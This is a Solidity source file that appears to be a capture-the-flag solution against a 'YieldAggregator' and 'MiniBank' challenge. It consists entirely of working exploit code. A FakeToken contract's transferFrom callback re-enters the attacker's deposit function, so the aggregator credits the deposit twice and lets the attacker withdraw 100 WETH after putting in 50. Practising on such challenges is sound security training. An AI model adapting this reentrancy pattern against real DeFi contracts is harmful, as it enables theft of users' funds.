// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract FakeToken {
    address owner;
    constructor() {
        owner = msg.sender;
    }
    function transferFrom(
        address src,
        address dst,
        uint256 qty
    ) external returns (bool) {
        YieldAggregatorAttacker(owner).deposit();
    }
    function approve(address guy, uint256 wad) external returns (bool) {
        // Does nothing.
    }
}

contract YieldAggregatorAttacker {

    Setup setup;

    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor(address _setupAddress) {
        setup = Setup(_setupAddress);
    }

    function attack() public payable {
        require(msg.value == 50 ether);
        YieldAggregator aggregator = YieldAggregator(setup.aggregator());
        MiniBank bank = MiniBank(setup.bank());

        weth.deposit{value: msg.value}();
        weth.approve(address(aggregator), type(uint256).max);
        {
            FakeToken fakeToken = new FakeToken();
            address[] memory _tokens = new address[](1);
            _tokens[0] = address(fakeToken);
            uint256[] memory _amounts = new uint256[](1);
            _amounts[0] = 0;
            aggregator.deposit(Protocol(address(bank)), _tokens, _amounts);
        }
        {
            address[] memory _tokens = new address[](1);
            _tokens[0] = address(weth);
            uint256[] memory _amounts = new uint256[](1);
            _amounts[0] = 100 ether;
            aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts);
        }
    }

    function deposit() public payable {
        YieldAggregator aggregator = YieldAggregator(setup.aggregator());
        MiniBank bank = MiniBank(setup.bank());
        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);
        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;
        aggregator.deposit(Protocol(address(bank)), _tokens, _amounts);
    }
}
